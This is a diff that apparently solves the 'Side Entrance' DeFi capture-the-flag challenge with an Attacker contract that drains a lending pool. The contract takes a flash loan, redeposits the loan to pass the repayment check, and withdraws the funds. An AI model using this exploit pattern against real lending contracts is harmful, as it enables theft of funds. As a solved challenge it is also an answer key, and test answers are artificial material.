@@ -45,7 +45,8 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        Attacker attacker = new Attacker(pool, recovery, address(pool).balance);
+        attacker.attack();
     }
 
     /**
@@ -55,4 +56,28 @@ contract SideEntranceChallenge is Test {
         assertEq(address(pool).balance, 0, "Pool still has ETH");
         assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
     }
+}
+
+contract Attacker {
+    SideEntranceLenderPool public pool;
+    address public recovery;
+    uint256 public balance;
+
+    constructor(SideEntranceLenderPool _pool, address _recovery, uint256 _balance) {
+        pool = _pool;
+        recovery = _recovery;
+        balance = _balance;
+    }
+
+    function execute() external payable {
+        pool.deposit{value: balance}();
+    }
+
+    function attack() external {
+        pool.flashLoan(balance);
+        pool.withdraw();
+        recovery.call{value: address(this).balance}("");
+    }
+
+    fallback() external payable {}
 }
